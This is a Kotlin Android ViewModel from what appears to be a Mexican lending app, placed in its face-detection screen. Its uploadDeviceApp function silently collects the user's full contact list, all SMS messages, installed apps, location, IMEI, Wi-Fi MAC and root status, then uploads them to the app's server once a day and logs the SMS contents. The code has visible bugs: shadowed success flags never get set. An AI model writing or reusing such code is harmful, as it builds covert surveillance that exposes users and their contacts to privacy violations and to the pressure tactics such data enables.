package com.neutron.mexicoloan.ui.face

import android.content.Context
import android.graphics.Bitmap
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.viewModelScope
import com.neutron.baselib.base.BaseApplication
import com.neutron.baselib.base.BaseViewModel
import com.neutron.baselib.bean.AdvanceLicenseResult
import com.neutron.baselib.bean.AppList
import com.neutron.baselib.bean.LatLng
import com.neutron.baselib.bean.UploadDeviceInfo
import com.neutron.baselib.utils.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.util.HashMap

class FaceDetectionVM:BaseViewModel() {

    val liveBase64 = MutableLiveData<String>()

    fun transfer(positiveFaceBitmap: Bitmap?) {
        viewModelScope.launch(Dispatchers.IO) {
            val base64 = Utils.bitmapToBase64(positiveFaceBitmap)
            withContext(Dispatchers.Main) {
                liveBase64.value = base64!!
            }
        }
    }


    fun uploadDeviceApp(context: Context) {


        if (System.currentTimeMillis() - PreferencesHelper.getUploadTime() <= 86400000) {
            Slog.d("今天已经上传过个人信息")
            return
        }

        var isPBS=false
        var isSMSS=false
        var isLocationS=false
        var isAppS=false




        val phone =    PreferencesHelper.getUserInfo()?.phone
        val userID = PreferencesHelper.getUserID()

        if (System.currentTimeMillis() - PreferencesHelper.getUploadTime() <= 86400000) {
            Slog.d("今天已经上传过个人信息")
            return
        }
        PreferencesHelper.setUploadTime(System.currentTimeMillis())
        Slog.d("上传个人信息")

        val contacts = Utils.getAllContacts(context)
        var hashMap = HashMap<String, Any>()
        hashMap["user_id"] = userID
        hashMap["self_mobile"] = phone?:""
        hashMap["account_id"] = phone?:""
        hashMap["uuid"] = DeviceInfoFactory.getInstance().getUUID() ?: ""
        hashMap["record"] = contacts!!.toArray()



        request({
            mLiveApiRepository.uploadPhone(hashMap.createBody())

        },{
            Slog.d("通讯录上传完成")

            var isPBS=true

        },{
            Slog.d("通讯录上传错误 $it")
            var isPBS=false
        },isShowLoading = false)



        val apps = Utils.getAppList(BaseApplication.sContext)
        val deviceInfoFactory: DeviceInfoFactory = DeviceInfoFactory.getInstance()
        val UUID=deviceInfoFactory.getUUID()
        val uploadDeviceRecord: MutableList<UploadDeviceInfo> = mutableListOf()
        val appRecord: MutableList<AppList> = mutableListOf()
        val user=PreferencesHelper.getUserInfo()

        apps?.forEach { appRecord.add(
            AppList(
                it.firstTime,
                it.lastTime,
                it.name,
                it.packageName,
                it.versionCode,
                it.systemApp
            )
        )            }
        uploadDeviceRecord.add(
            UploadDeviceInfo(
                user?.user_id,
                deviceInfoFactory.getIMEI(),
                deviceInfoFactory.getBrands(),
//                    user?.phonepre + "" + user?.phone,
                deviceInfoFactory.getMobil(),
                user?.phone,
                deviceInfoFactory.getCpuModel(),
                deviceInfoFactory.getCpuCores(),
                deviceInfoFactory.getRAMInfo(),
                deviceInfoFactory.getRomInfo(),
                deviceInfoFactory.getResolution(),
                deviceInfoFactory.openAppBatteryLevel?.toString(),
                deviceInfoFactory.openAppTime,
                deviceInfoFactory.getSystemVersion(),
                deviceInfoFactory.getBatteryLevel().toString(),
                deviceInfoFactory.getCurrentTime(),
                "0",
                deviceInfoFactory.whetherScreenshot.toString(),
                deviceInfoFactory.isSuEnableRoot().toString(),
                deviceInfoFactory.getWifiName(),
                deviceInfoFactory.getWifiMac(),
                deviceInfoFactory.getWifiState(),
                deviceInfoFactory.virtualMachine.toString(),
                "0",
                appRecord
            )
        )
        val eprePhone = "${user?.phonepre}${user?.phone}"

        var hashMap1 = HashMap<String, Any>()
        hashMap1["account_id"] = eprePhone
        hashMap1["uuid"] = deviceInfoFactory.getUUID().toString()
        hashMap1["imei"] = deviceInfoFactory.getIMEI().toString()
        hashMap1["pkg_name"] = BaseApplication.sContext.packageName
        hashMap1["record"] = uploadDeviceRecord
        hashMap1["user_id"] = user?.user_id?:""
        hashMap1["self_mobile"] = eprePhone


        request({
            mLiveApiRepository.uploadApp(hashMap1.createBody())

        },{
            Slog.d("APP上传完成")
            var isAppS=true
        },{
            Slog.d("APP上传错误 $it")
            var isAppS=false
        },isShowLoading = false)


//位置
        PreferencesHelper.getLatLng()?.let {
            var hashMap3 = HashMap<String, Any>()
           hashMap3["user_id"] = userID
           hashMap3["account_id"] = phone?:""
           hashMap3["record"] = arrayOf(LatLng(it.position_x,it.position_y))
           hashMap3["uuid"] = UUID ?: ""

            request({
                mLiveApiRepository.uploadLocation(hashMap3.createBody())

            },{
                Slog.d("位置上传完成")
                var isLocationS=true
            },{
                Slog.d("位置上传错误 $it")
                var isLocationS=false
            },isShowLoading = false)

        }



        val record = Utils.getMessage(context)
        Slog.d("record  $record")
        if (record.size > 0) {
            val hashMap4 = HashMap<String, Any>()
            hashMap4["user_id"] =userID
            hashMap4["self_mobile"] = phone?:""
            hashMap4["account_id"] = phone?:""
            hashMap4["record"] = record

            request({
                mLiveApiRepository.uploadMessage(hashMap4.createBody())

            },{
                Slog.d("短信上传完成")
                var isSMSS=true
            },{
                Slog.d("短信上传错误 $it")
                var isSMSS=false

            },isShowLoading = false)

        }


if(isSMSS&&isPBS&&isLocationS&&isAppS){

    PreferencesHelper.setUploadTime(System.currentTimeMillis())
    Slog.d("上传个人信息全部完成")

}


    }



}